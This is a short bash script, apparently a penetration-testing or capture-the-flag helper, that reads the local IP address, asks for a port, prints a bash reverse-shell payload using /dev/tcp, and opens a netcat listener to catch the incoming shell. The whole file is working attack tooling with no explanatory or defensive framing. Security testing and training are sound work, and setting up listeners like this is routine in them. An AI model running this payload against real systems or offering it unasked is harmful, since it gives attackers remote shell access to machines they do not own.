#!/bin/bash
MYIP=$(hostname -I | awk '{print $1}')
echo "Port: "; read PORT
echo "Your Payload: bash -i >& /dev/tcp/$MYIP/$PORT 0>&1"
nc -lvnp $PORT